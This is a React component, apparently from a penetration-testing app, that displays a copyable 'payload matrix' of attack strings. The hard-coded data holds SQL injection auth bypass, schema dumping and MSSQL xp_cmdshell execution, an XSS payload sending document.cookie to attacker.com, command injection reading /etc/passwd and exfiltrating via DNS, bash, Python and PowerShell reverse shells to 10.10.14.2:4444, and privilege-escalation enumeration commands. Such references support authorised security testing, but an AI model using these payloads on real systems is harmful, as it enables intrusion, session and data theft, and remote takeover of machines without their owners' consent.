import React, { useState, useMemo } from 'react';
import { ProfileThemeTokens } from '../types/profileTypes';
import { AppLogo } from '../../components/common/AppLogo';

interface PayloadEntry {
  id: string;
  category: 'SQLI' | 'XSS' | 'CMD_INJECTION' | 'REVSHELL' | 'LIN_PRIVESC' | 'WIN_PRIVESC' | 'SECLISTS';
  title: string;
  description: string;
  payload: string;
  tags: string[];
}

const PAYLOAD_DATABASE: PayloadEntry[] = [
  // 1. SQL Injection
  {
    id: 'sqli-auth-bypass',
    category: 'SQLI',
    title: 'Classic Auth Bypass (Generic SQL)',
    description: 'Bypasses username/password authentication checks by evaluating expression to true.',
    payload: "' OR 1=1 -- -",
    tags: ['Auth Bypass', 'MySQL', 'PostgreSQL', 'SQLite'],
  },
  {
    id: 'sqli-union-dump',
    category: 'SQLI',
    title: 'UNION SELECT Column & Table Extraction',
    description: 'Extracts database tables and schema details via reflective UNION injection.',
    payload: "' UNION SELECT 1, table_name, column_name, 4 FROM information_schema.columns WHERE table_schema=database()-- -",
    tags: ['Information Schema', 'UNION', 'MySQL'],
  },
  {
    id: 'sqli-time-blind-pg',
    category: 'SQLI',
    title: 'PostgreSQL Time-Based Blind Injection',
    description: 'Causes a deterministic 5-second sleep to verify blind SQL execution without visible output.',
    payload: "'; SELECT pg_sleep(5);--",
    tags: ['PostgreSQL', 'Time-Based Blind', 'Sleep'],
  },
  {
    id: 'sqli-mssql-xpcmdshell',
    category: 'SQLI',
    title: 'MSSQL RCE via xp_cmdshell',
    description: 'Enables xp_cmdshell advanced options and triggers OS command execution on Microsoft SQL Server.',
    payload: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
    tags: ['MSSQL', 'RCE', 'xp_cmdshell'],
  },

  // 2. Cross-Site Scripting (XSS)
  {
    id: 'xss-svg-polyglot',
    category: 'XSS',
    title: 'WAF-Bypass SVG Onload Vector',
    description: 'Bypasses common regex filters that strip `<script>` tags by utilizing self-executing SVG event handlers.',
    payload: '<svg/onload=fetch(`http://attacker.com/steal?c=${btoa(document.cookie)}`)>',
    tags: ['WAF Bypass', 'SVG', 'Cookie Exfil'],
  },
  {
    id: 'xss-img-onerror',
    category: 'XSS',
    title: 'Minimal Image Onerror Trigger',
    description: 'Standard XSS trigger requiring no user interaction.',
    payload: '<img src=x onerror="alert(document.domain)">',
    tags: ['Stored XSS', 'Reflected XSS'],
  },

  // 3. Command Injection
  {
    id: 'cmd-ifs-bypass',
    category: 'CMD_INJECTION',
    title: 'Space-Filtered Command Injection ($IFS)',
    description: 'Executes commands when spaces are stripped or blacklisted by the input validation filter.',
    payload: ';cat$IFS/etc/passwd;',
    tags: ['Filter Bypass', 'Linux', 'Whitespace'],
  },
  {
    id: 'cmd-dns-oob',
    category: 'CMD_INJECTION',
    title: 'Out-of-Band (OOB) DNS Ping Verification',
    description: 'Sends command output via subdomains to an attacker-controlled Burp Collaborator or Interactsh instance.',
    payload: ';ping -c 1 $(whoami).attacker-domain.com;',
    tags: ['Blind Command Injection', 'OOB', 'DNS'],
  },

  // 4. Reverse Shells
  {
    id: 'rev-bash-tcp',
    category: 'REVSHELL',
    title: 'Bash Interactive TCP Socket',
    description: 'Pure Bash reverse shell requiring no secondary binaries like netcat or python.',
    payload: 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1',
    tags: ['Bash', 'Linux', 'One-Liner'],
  },
  {
    id: 'rev-python3-pty',
    category: 'REVSHELL',
    title: 'Python 3 Full PTY Reverse Shell',
    description: 'Spawns a full pseudo-terminal shell via Python socket and pty.spawn.',
    payload: "python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.2\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
    tags: ['Python 3', 'PTY', 'Interactive'],
  },
  {
    id: 'rev-powershell-base64',
    category: 'REVSHELL',
    title: 'PowerShell Encoded Command Wrapper',
    description: 'Base64 encoded UTF-16LE payload bypassing simple script-block character filters.',
    payload: '$c = New-Object System.Net.Sockets.TCPClient("10.10.14.2",4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$p = (iex $d 2>&1 | Out-String );$r = $p + "PS " + (pwd).Path + "> ";$by = ([text.encoding]::ASCII).GetBytes($r);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()',
    tags: ['Windows', 'PowerShell', 'Evasion'],
  },

  // 5. Linux Privilege Escalation
  {
    id: 'priv-linux-suid',
    category: 'LIN_PRIVESC',
    title: 'SUID Binaries Reconnaissance One-Liner',
    description: 'Finds all files with SUID bit set that execute with root permissions.',
    payload: 'find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;',
    tags: ['SUID', 'GTFOBins', 'Enumeration'],
  },
  {
    id: 'priv-linux-sudo',
    category: 'LIN_PRIVESC',
    title: 'Check Sudo Permissions Without Password',
    description: 'Lists allowed commands for current user under sudo privileges.',
    payload: 'sudo -l',
    tags: ['Sudo', 'Quick Win'],
  },

  // 6. Windows Privilege Escalation
  {
    id: 'priv-win-unquoted-svc',
    category: 'WIN_PRIVESC',
    title: 'Unquoted Service Paths Search',
    description: 'Finds auto-starting Windows services with unquoted paths containing spaces.',
    payload: 'wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\\windows\\\\" |findstr /i /v """',
    tags: ['Windows', 'Services', 'WMIC'],
  },
  {
    id: 'priv-win-privs',
    category: 'WIN_PRIVESC',
    title: 'Check Token Privileges (SeImpersonate)',
    description: 'Verifies whether current account holds SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege for Potato exploits.',
    payload: 'whoami /priv | findstr /i "Impersonate AssignPrimary"',
    tags: ['SeImpersonate', 'Potato', 'JuicyPotato'],
  },

  // 7. SecLists Fuzzing Parameters
  {
    id: 'seclist-top-params',
    category: 'SECLISTS',
    title: 'Top Web Application Fuzzing Parameters (SecLists)',
    description: 'High-frequency query parameters for hidden endpoints and debug interfaces.',
    payload: 'id\npage\nfile\nurl\npath\nredirect\ndebug\nadmin\nview\nquery\ntoken\napi_key\ncmd\nexec\nsource\ntemplate',
    tags: ['SecLists', 'Wordlist', 'Fuzzing'],
  },
];

export const PayloadMatrixPane: React.FC<{ theme: ProfileThemeTokens }> = ({ theme }) => {
  const [selectedCategory, setSelectedCategory] = useState<string>('ALL');
  const [searchQuery, setSearchQuery] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Filtered payloads
  const filteredPayloads = useMemo(() => {
    return PAYLOAD_DATABASE.filter((entry) => {
      const matchCat = selectedCategory === 'ALL' || entry.category === selectedCategory;
      const q = searchQuery.toLowerCase();
      const matchQuery =
        !q ||
        entry.title.toLowerCase().includes(q) ||
        entry.description.toLowerCase().includes(q) ||
        entry.payload.toLowerCase().includes(q) ||
        entry.tags.some((t) => t.toLowerCase().includes(q));
      return matchCat && matchQuery;
    });
  }, [selectedCategory, searchQuery]);

  const handleCopy = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div
      className="w-full h-full flex flex-col font-mono text-xs overflow-hidden"
      style={{ backgroundColor: theme.bgPrimary, color: theme.textPrimary }}
    >
      {/* Top Header */}
      <div
        className="h-10 px-3 border-b flex items-center justify-between flex-shrink-0"
        style={{ borderColor: theme.borderPrimary, backgroundColor: theme.bgSecondary }}
      >
        <div className="flex items-center gap-2">
          <AppLogo name="payload" className="w-5 h-5" />
          <span className="font-bold tracking-wider uppercase text-[11px]" style={{ color: theme.accentPrimary }}>
            PAYLOADS-ALL-THE-THINGS & SECLISTS FORGE
          </span>
          <span className="text-[10px] text-neutral-500">| 100% SEARCHABLE EXPLOIT ENGINE</span>
        </div>

        <div className="flex items-center gap-2">
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Search SQLi, XSS, RevShell, PrivEsc..."
            className="px-2.5 py-1 rounded bg-black/60 border border-neutral-800 text-[11px] text-white focus:outline-none focus:border-red-500 w-64"
          />
        </div>
      </div>

      {/* Categories Toolbar */}
      <div
        className="h-9 px-3 border-b flex items-center gap-1.5 overflow-x-auto flex-shrink-0"
        style={{ borderColor: theme.borderPrimary, backgroundColor: theme.bgPanel }}
      >
        {(
          [
            { id: 'ALL', label: 'All Payloads' },
            { id: 'SQLI', label: 'SQL Injection' },
            { id: 'XSS', label: 'XSS Bypass' },
            { id: 'CMD_INJECTION', label: 'Command Injection' },
            { id: 'REVSHELL', label: 'Reverse Shells' },
            { id: 'LIN_PRIVESC', label: 'Linux PrivEsc' },
            { id: 'WIN_PRIVESC', label: 'Windows PrivEsc' },
            { id: 'SECLISTS', label: 'SecLists Parameters' },
          ] as const
        ).map((cat) => (
          <button
            key={cat.id}
            onClick={() => setSelectedCategory(cat.id)}
            className={`px-2.5 py-0.5 rounded text-[10px] font-bold whitespace-nowrap transition-colors cursor-pointer ${
              selectedCategory === cat.id
                ? 'bg-red-600 text-white'
                : 'bg-neutral-800/80 text-neutral-400 hover:text-white'
            }`}
          >
            {cat.label}
          </button>
        ))}
      </div>

      {/* Payloads Grid */}
      <div className="flex-1 p-4 overflow-y-auto space-y-3">
        {filteredPayloads.map((item) => {
          const isCopied = copiedId === item.id;
          return (
            <div
              key={item.id}
              className="p-3 rounded-lg border border-neutral-800 bg-black/40 space-y-2 hover:border-red-900/60 transition-colors"
            >
              <div className="flex items-start justify-between gap-2">
                <div>
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-white text-[12px]">{item.title}</span>
                    <span className="text-[9px] px-1.5 py-0.2 rounded bg-neutral-800 text-neutral-300 font-bold uppercase">
                      {item.category}
                    </span>
                  </div>
                  <p className="text-[10px] text-neutral-400 mt-0.5">{item.description}</p>
                </div>

                <button
                  onClick={() => handleCopy(item.id, item.payload)}
                  className={`px-2.5 py-1 rounded text-[10px] font-bold transition-all cursor-pointer flex-shrink-0 ${
                    isCopied
                      ? 'bg-emerald-600 text-white'
                      : 'bg-red-950/40 text-red-400 border border-red-800/50 hover:bg-red-900/60'
                  }`}
                >
                  {isCopied ? '✓ COPIED!' : 'COPY PAYLOAD'}
                </button>
              </div>

              {/* Payload Code Block */}
              <div className="p-2 rounded bg-black/90 font-mono text-[11px] text-red-300 border border-neutral-900 break-all select-all leading-relaxed">
                {item.payload}
              </div>

              {/* Tags */}
              <div className="flex items-center gap-1.5 pt-1">
                {item.tags.map((tag) => (
                  <span
                    key={tag}
                    className="text-[9px] px-1.5 py-0.2 rounded bg-neutral-900 text-neutral-400 border border-neutral-800"
                  >
                    #{tag}
                  </span>
                ))}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
};
export default PayloadMatrixPane;
